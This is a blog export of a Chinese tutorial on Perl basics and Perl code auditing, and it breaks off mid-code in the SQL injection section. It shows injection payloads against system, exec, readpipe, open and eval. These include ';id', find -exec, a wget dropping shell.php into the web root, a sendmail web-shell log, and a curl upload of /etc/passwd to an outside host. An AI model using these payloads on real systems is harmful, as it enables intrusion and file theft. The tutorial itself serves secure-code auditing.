<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>（信安之路首发）Perl基础&amp;代码审计</title>
    <url>/2020/11/24/Perl%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>本篇博客首发于信安之路：《perl 代码审计从基础到实战》</p>
<h2 id="0x01-Perl基础"><a href="#0x01-Perl基础" class="headerlink" title="0x01 Perl基础"></a>0x01 Perl基础</h2><p>Perl基础部分参考自：<a href="https://www.runoob.com/perl/perl-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/perl/perl-tutorial.html</a></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Perl全称Practical Extraction and Report Language，一种功能丰富的计算机程序语言，运行在超过100种计算机平台上，适用广泛，从大型机到便携设备，从快速原型创建到大规模可扩展开发，其最重要的特性是Perl内部集成了正则表达式的功能以及巨大的第三方代码库CPAN。</p>
<p>Perl语言的应用范围很广，除CGI以外，Perl被用于图形编程、系统管理、网络编程、金融、生物以及其他领域。由于其灵活性，Perl被称为脚本语言中的瑞士军刀。</p>
<p>Perl是一种弱类型语言。</p>
<h3 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h3><ol>
<li>交互式：<code>perl -e &lt;perl code&gt;</code></li>
<li>运行脚本（以.pl、.PL作为后缀）：<code>perl script.pl</code></li>
</ol>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>Perl是一种弱类型语言，所以变量不需要指定类型，Perl解释器会根据上下文自动选择匹配类型。</p>
<p>Perl有三个基本的数据类型：</p>
<ul>
<li>标量：标量是 Perl 语言中最简单的一种数据类型。这种数据类型的变量可以是数字，字符串，浮点数，不作严格的区分。在使用时在变量的名字前面加上一个<code>$</code>，表示是标量。例如：<code>$a=123;</code></li>
<li>数组：数组变量以字符<code>@</code>开头，索引从0开始，如：<code>@arr=(1,2,3)</code></li>
<li>哈希：哈希是一个无序的键值对集合。可以使用键作为下标获取值。哈希变量以字符<code>%</code>开头。如：<code>%h=(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2);</code></li>
</ul>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>Perl借用了C、sed、awk、shell脚本以及很多其他编程语言的特性，语法与这些语言有些类似，也有自己的特点。</p>
<p>Perl 程序有声明与语句组成，程序自上而下执行，包含了循环，条件控制，每个语句以分号 (;) 结束。</p>
<p>Perl 语言没有严格的格式规范，你可以根据自己喜欢的风格来缩进。</p>
<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>Perl注释的方法为在语句的开头用字符<code>#</code>，如：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这一行是 perl 中的注释</span></span><br></pre></td></tr></table></figure>
<p>Perl也支持多行注释，最常用的方法是使用POD(Plain Old Documentations) 来进行多行注释。方法如下:</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 这是一个单行注释</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hello, world\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">=pod 注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">=cut</span></span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li>=pod、 =cut只能在行首。</li>
<li>以=开头，以=cut结尾。</li>
<li>=后面要紧接一个字符，=cut后面可以不用。</li>
</ul>
<h4 id="空白符解析特点"><a href="#空白符解析特点" class="headerlink" title="空白符解析特点"></a>空白符解析特点</h4><p>Perl解释器不会关心有多少个空白，所有类型的空白如空格、Tab、换行等如果在引号外解释器会忽略它，如果在引号内会原样输出。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>           <span class="string">"Hello</span></span><br><span class="line"><span class="string">          world\n"</span>;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello</span><br><span class="line">          world</span><br></pre></td></tr></table></figure>
<h4 id="单双引号解析区别"><a href="#单双引号解析区别" class="headerlink" title="单双引号解析区别"></a>单双引号解析区别</h4><p>Perl双引号和单引号的区别：双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出，但是用单引号定义可以使用多行文本。这点和PHP类似（双引号解析变量、而单引号不解析变量）。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line">$a = <span class="string">"mi1k7ea"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"a = $a\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'a = $a\n'</span>;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = mi1k7ea</span><br><span class="line">a = $a\n</span><br></pre></td></tr></table></figure>
<p>Tips：</p>
<p>（1）双中有双，单中有单都需要<code>\</code>转义。</p>
<p>（2）双中有单或单中有双均不需要转义。</p>
<p>（3）单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。</p>
<h4 id="Here文档"><a href="#Here文档" class="headerlink" title="Here文档"></a>Here文档</h4><p>Here文档又称作heredoc、hereis、here-字串或here-脚本，是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line">$var = &lt;&lt;<span class="string">"Mi1k7ea"</span>;</span><br><span class="line">这是一个 Here 文档实例，使用双引号。</span><br><span class="line">可以在这输如字符串和变量。</span><br><span class="line">例如：a = $a</span><br><span class="line">Mi1k7ea</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$var\n"</span>;</span><br><span class="line"> </span><br><span class="line">$var = &lt;&lt;<span class="string">'Mi1k7ea'</span>;</span><br><span class="line">这是一个 Here 文档实例，使用单引号。</span><br><span class="line">例如：a = $a</span><br><span class="line">Mi1k7ea</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$var\n"</span>;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是一个 Here 文档实例，使用双引号。</span><br><span class="line">可以在这输如字符串和变量。</span><br><span class="line">例如：a = 10</span><br><span class="line"></span><br><span class="line">这是一个 Here 文档实例，使用单引号。</span><br><span class="line">例如：a = $a</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li>必须后接分号，否则编译通不过；</li>
<li>EOF可以用任意其它字符代替（例子用的Mi1k7ea），只需保证结束标识与开始标识一致；</li>
<li>结束标识必须顶格独自占一行（即必须从行首开始，前后不能衔接任何空白和字符）；</li>
<li>开始标识可以不带引号号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号；</li>
<li>当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法；</li>
</ul>
<h3 id="子程序（函数）及传参"><a href="#子程序（函数）及传参" class="headerlink" title="子程序（函数）及传参"></a>子程序（函数）及传参</h3><p>Perl子程序即用户定义的函数。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 函数调用</span></span><br><span class="line">Hello();</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>
<p>Perl函数参数使用特殊数组<code>@_</code>标明，函数第一个参数为<code>$_[0]</code>、第二个参数为<code>$_[1]</code>，依次类推。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">'传入的参数：'</span>, <span class="string">"@_\n"</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"$_[0].$_[1]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"返回结果："</span>, Test(<span class="string">'mi1k7ea'</span>, <span class="string">'com'</span>), <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">传入的参数：mi1k7ea com</span><br><span class="line">返回结果：mi1k7ea.com</span><br></pre></td></tr></table></figure>
<h3 id="CGI环境搭建与CGI编程"><a href="#CGI环境搭建与CGI编程" class="headerlink" title="CGI环境搭建与CGI编程"></a>CGI环境搭建与CGI编程</h3><p>CGI环境搭建：下载Apache httpd服务器，直接运行然后访问<code>http://localhost/cgi-bin/printEnv.pl</code>即可：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/29.png" alt=""></p>
<p>正常没问题的话是如上图所示。注意一点，pl或cgi文件中第一行指定perl程序所在路径必须正确，否则会出现500 Error，我这里本地修改为<code>#!D:\Strawberry\perl\bin\perl.exe</code>。</p>
<p>第一个CGI程序，test.cgi：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type:text/html\r\n\r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;html&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;head&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;meta charset="utf-8"&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;title&gt;mi1k7ea.com&lt;/title&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;/head&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;body&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;h2&gt;Hello World!&lt;/h2&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Mi1k7ea的第一个CGI程序。&lt;/p&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;/body&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;/html&gt;'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/30.png" alt=""></p>
<p>更多具体CGI参考：<a href="https://www.runoob.com/perl/perl-cgi-programming.html" target="_blank" rel="noopener">Perl CGI编程</a></p>
<h2 id="0x02-Perl代码审计"><a href="#0x02-Perl代码审计" class="headerlink" title="0x02 Perl代码审计"></a>0x02 Perl代码审计</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h4><p>system()函数执行命令是有回显的。system后可以有圆括号，也可以没有。</p>
<h5 id="参数全部可控"><a href="#参数全部可控" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$cmd = <span class="string">"echo hacked"</span>;</span><br><span class="line"><span class="keyword">system</span>($cmd)</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># $cmd = $ARGV[0];</span></span><br><span class="line"><span class="comment"># system($cmd);</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/2.png" alt=""></p>
<h5 id="参数部分可控"><a href="#参数部分可控" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p>直接拼接命令的场景，可使用命令注入分隔符绕过：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = $ARGV[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"cat /tmp/$param"</span>);</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># $param = ";whoami";</span></span><br><span class="line"><span class="comment"># system("cat /tmp/$param");</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/3.png" alt=""></p>
<p>将命令和参数分隔开就不行了，原因在于传递给system的参数变成了数组形式、严格按命令和参数进行区分了：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = <span class="string">";ls"</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"echo"</span>, <span class="string">"helloworld$param"</span>);</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># @cmd = ("echo","helloworld;ls");</span></span><br><span class="line"><span class="comment"># system @cmd;</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># $param = $ARGV[0];</span></span><br><span class="line"><span class="comment"># system("echo", "helloworld$param");</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/6.png" alt=""></p>
<h5 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h5><p>由前面数组形式执行system函数知道，命令注入是不成功的，但是某些写死的命令是可以进行参数注入的。但是这种注入方式较苛刻，需要有两处连续的可控点。</p>
<p><strong>tar参数注入</strong></p>
<p>tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。注入点需要–use-compress-program参数及其后面的参数值两处。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">@cmd = (<span class="string">"tar"</span>,<span class="string">"--use-compress-program"</span>,<span class="string">"touch /tmp/perltest/mi1k7ea"</span>,<span class="string">"-cf"</span>,<span class="string">"/tmp/perltest/passwd"</span>,<span class="string">"/etc/passwd"</span>);</span><br><span class="line"><span class="keyword">system</span> @cmd;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/4.png" alt=""></p>
<p><strong>find参数注入</strong></p>
<p>find命令的-exec参数选项可以执行命令，若存在参数注入则可利用。注入点需要–execs参数及其后面的参数值两处。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">@cmd = (<span class="string">"find"</span>,<span class="string">"/tmp"</span>,<span class="string">"-iname"</span>,<span class="string">"sth"</span>,<span class="string">"-or"</span>,<span class="string">"-exec"</span>,<span class="string">"id"</span>,<span class="string">";"</span>,<span class="string">"-quit"</span>);</span><br><span class="line"><span class="keyword">system</span> @cmd;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/7.png" alt=""></p>
<p><strong>wget参数注入</strong></p>
<p>wget命令的–directory-prefix参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。注入点需要–directory-prefix参数及其后面的参数值两处和远程URL地址一处。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">@cmd = (<span class="string">"wget"</span>,<span class="string">"--directory-prefix"</span>,<span class="string">"/var/www/html"</span>,<span class="string">"http://127.0.0.1:8080/shell.php"</span>);</span><br><span class="line"><span class="keyword">system</span> @cmd;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/8.png" alt=""></p>
<p><strong>sendmail参数注入</strong></p>
<p>sendmail涉及到参数注入的几个参数：</p>
<ol>
<li>-O option = value：QueueDirectory = queuedir 选择队列消息</li>
<li>-X logfile：这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。</li>
<li>-C file：这个参数用File变量指定的备用配置文件启动sendmail命令。</li>
</ol>
<p>常见的参数注入方式，这里只列出用法不举例了：</p>
<ul>
<li>向Web目录写日志Shell：<code>-O QueueDirectory=/tmp -X /var/www/html/log-shell.php</code></li>
<li>任意文件读取：<code>-C/etc/passwd -X/tmp/output.txt</code></li>
</ul>
<p><strong>curl参数注入</strong></p>
<p>curl命令的-F参数选项为以POST方式提交表单，-T参数选项为上传文件，这些参数选项都存在参数注入风险。</p>
<p>常见的参数注入方式，这里只列出用法不举例了：</p>
<ul>
<li>以POST方式提交任意文件：<code>-F filename=@/etc/passwd http://a.com/b.php</code></li>
<li>上传任意文件：<code>-T /etc/passwd ftp://10.0.0.10</code></li>
</ul>
<h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>在参数部分可控且不存在参数注入的场景下，如果注入的参数值为文件路径，那么就可以尝试进行目录遍历攻击。</p>
<p>比如：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = $ARGV[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"cat /tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/9.png" alt=""></p>
<h4 id="exec-函数"><a href="#exec-函数" class="headerlink" title="exec()函数"></a>exec()函数</h4><p>exec()函数和system()函数类似，执行命令是有回显的。exec后可以有圆括号，也可以没有。两者最大的区别是system()函数创建了一个fork进程，并等待查看命令是成功还是失败（返回一个值）；而exec()函数不返回任何内容，它只是执行命令。</p>
<h5 id="参数全部可控-1"><a href="#参数全部可控-1" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$cmd = <span class="string">"echo exec_inject"</span>;</span><br><span class="line"><span class="keyword">exec</span> $cmd;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/10.png" alt=""></p>
<h5 id="参数部分可控-1"><a href="#参数部分可控-1" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p>和前面system的情况一样，未进行数组分隔时能注入命令执行：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = <span class="string">";id"</span>;</span><br><span class="line"><span class="keyword">exec</span>(<span class="string">"cat /tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/11.png" alt=""></p>
<p>同样，数组分隔传参就不行了：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = <span class="string">";id"</span>;</span><br><span class="line"><span class="keyword">exec</span>(<span class="string">"echo"</span>, <span class="string">"helloworld$param"</span>);</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># @a = ("echo","helloworld$ARGV[0]");</span></span><br><span class="line"><span class="comment"># exec @a;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/12.png" alt=""></p>
<p>此时可尝试如前面system()函数中讲到的参数注入或者目录遍历，这里不多说。</p>
<h4 id="readpipe-函数"><a href="#readpipe-函数" class="headerlink" title="readpipe()函数"></a>readpipe()函数</h4><p>readpipe()函数将EXPR作为命令执行，然后返回命令执行后的结果。也就是说，单单运行该函数是获取不到命令执行的回显结果的，需要结合print才能看到回显。</p>
<h5 id="参数全部可控-2"><a href="#参数全部可控-2" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">@result = <span class="keyword">readpipe</span>(<span class="string">"ls -l /tmp"</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"@result"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令无回显</span></span><br><span class="line"><span class="keyword">readpipe</span>(<span class="string">"touch /tmp/perltest/hacked"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/13.png" alt=""></p>
<h5 id="参数部分可控-2"><a href="#参数部分可控-2" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p><strong>readpipe()函数和前面两个命令执行函数不一样，即使是数组分隔命令和参数传参还是会执行命令！</strong></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">@param = (<span class="string">"cat"</span>,<span class="string">"/tmp/;id"</span>);</span><br><span class="line">@result = <span class="keyword">readpipe</span> @param;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"@result"</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/14.png" alt=""></p>
<h4 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h4><p>在Perl中open()函数被用来打开文件。该函数最为常见的使用形式如下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">open</span> (FILEHANDLE, <span class="string">"filename"</span>);</span><br></pre></td></tr></table></figure>
<p>在Perl的open()函数中，如果在文件名后加上管道符”|”，则Perl将会执行这个文件，而不是打开它。</p>
<h5 id="参数全部可控-3"><a href="#参数全部可控-3" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><p>open()函数的filename参数可以在其第一个字符前或最后一个字符后注入管道符来实现命令注入：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">open</span>(STATFILE, <span class="string">"|touch /tmp/perltest/hacked"</span>);</span><br><span class="line"><span class="keyword">open</span>(STATFILE, <span class="string">"touch /tmp/perltest/hacked|"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有回显</span></span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"|id"</span>);</span><br><span class="line"><span class="comment"># 无回显</span></span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"id|"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/15.png" alt=""></p>
<h5 id="参数部分可控-3"><a href="#参数部分可控-3" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p>因为filename一般就是某个文件路径，当filename参数前面已经指定好路径但实现参数拼接时，我们可以使用目录遍历的方法来实现注入：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = <span class="string">"../bin/touch /tmp/perltest/hacked|"</span>;</span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"/tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/16.png" alt=""></p>
<p>但如果是有重定向符写死的就不可以注入了，如果filename是含有<code>&gt;</code>标志的前缀，那么它是为输出而打开的，并且如果文件已经存在据就会覆盖原文件；如果含有<code>&gt;&gt;</code>前缀，那么是为追加打开的；前缀<code>&lt;</code>打开文件来进行输入操作，这也是不含前缀的时候的默认方式。比如：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = <span class="string">"../bin/touch /tmp/perltest/hacked|"</span>;</span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"&lt;"</span>, <span class="string">"/tmp/$param"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$param = <span class="string">"../bin/touch /tmp/perltest/hacked|"</span>;</span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"&lt;/tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>Perl的反引号和PHP的反引号一样，可用于执行系统命令。具体利用场景需要具体分析。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$param = <span class="string">"whoami"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">`$param`</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/5.png" alt=""></p>
<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>Perl的eval函数的参数就是一段Perl代码，与PHP以及JS的eval类似，会执行自己语言的代码。</p>
<p>Perl的eval有两种使用方式，即eval EXPR和eval BLOCK。</p>
<h5 id="eval-EXPR"><a href="#eval-EXPR" class="headerlink" title="eval EXPR"></a>eval EXPR</h5><p>EXPR即表达式。在执行时， Perl解释器会首先解析表达式的值，然后将表达式值作为一条Perl语句插入当前执行上下文。所以，新生成的语句与eval语句本身具有相同的上下文环境。这种方式中，每次执行eval语句，表达式都会被解析。所以，如果eval EXPR如果出现在循环中，表达式可能会被解析多次。 eval的这种方式使得Perl脚本程序能实时生成和执行代码，从而实现了“动态代码”。</p>
<p>使用示例：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> <span class="string">"print 'mi1k7ea'"</span>;</span><br><span class="line"><span class="keyword">eval</span> <span class="string">'print $a'</span> . <span class="string">', $b'</span> ;</span><br><span class="line"><span class="keyword">eval</span> <span class="number">1</span> + <span class="number">3</span> ;</span><br><span class="line"><span class="keyword">eval</span> <span class="string">'print '</span> . <span class="string">'$a + $b, "\n"'</span> ;</span><br><span class="line"><span class="keyword">eval</span> $command;<span class="comment">#$command = 'print "mi1k7ea"'</span></span><br><span class="line"><span class="keyword">eval</span> $ARGV[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>如果eval中的EXPR即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> $ARGV[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>此时直接注入<code>system(&#39;touch /tmp/perltest/mi1k7ea&#39;)</code>：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/1.png" alt=""></p>
<h5 id="eval-BLOCK"><a href="#eval-BLOCK" class="headerlink" title="eval BLOCK"></a>eval BLOCK</h5><p>BLOCK即代码块。与第一种方式不同， BLOCK只会被解析一次，然后整个插入当前eval函数所在的执行上下文。由于解析上的性能的优势，以及可以在编译时进行代码语法检查，这种方式通常被作为Perl用来为一段代码提供异常捕捉机制，虽然前一种方式也可以。</p>
<p>使用示例：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> &#123;<span class="keyword">print</span> $a&#125;;</span><br><span class="line"><span class="keyword">eval</span> &#123;$a = <span class="number">1</span>, $b = <span class="number">2</span>, $c = $a + $b&#125;;</span><br></pre></td></tr></table></figure>
<p>如果eval中的BLOCK即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> &#123;<span class="keyword">system</span>(<span class="string">"touch /tmp/perltest/mi1k7ea"</span>);&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/17.png" alt=""></p>
<p>另一种Block调用：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">push</span> ( @program,<span class="string">'system("touch /tmp/perltest/mi1k7ea");'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> $exp (@program)</span><br><span class="line">&#123;</span><br><span class="line">    $return = <span class="keyword">eval</span>($exp);</span><br><span class="line">    <span class="keyword">print</span> $return,<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/18.png" alt=""></p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>Perl中操作数据库默认就支持预编译，但是如果使用不当同样是存在SQL注入漏洞的。关键在于，没有正确使用占位符<code>?</code>。</p>
<p>在Perl中可以使用DBI（Database Independent Interface）模块来连接数据库。DBI作为Perl语言中和数据库进行通讯的标准接口，它定义了一系列的方法、变量和常量，提供一个和具体数据库平台无关的数据库持久层。</p>
<p>DBI相关函数如下：</p>
<ul>
<li>connect()函数：用于连接数据库；</li>
<li>prepare()函数：用于预处理SQL语句；</li>
<li>execute()函数：用于执行SQL语句；</li>
<li>finish()函数：用于释放语句句柄；</li>
<li>disconnect()函数：用于断开数据库连接；</li>
</ul>
<p>正确使用预编译占位符的例子：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $host = <span class="string">"localhost"</span>;</span><br><span class="line"><span class="keyword">my</span> $driver = <span class="string">"mysql"</span>;</span><br><span class="line"><span class="keyword">my</span> $database = <span class="string">"test"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 驱动程序对象的句柄</span></span><br><span class="line"><span class="keyword">my</span> $dsn = <span class="string">"DBI:$driver:database=$database:$host"</span>;</span><br><span class="line"><span class="keyword">my</span> $userid = <span class="string">"root"</span>;</span><br><span class="line"><span class="keyword">my</span> $password = <span class="string">"root"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $username = $ARGV[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>($dsn, $userid, $password ) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 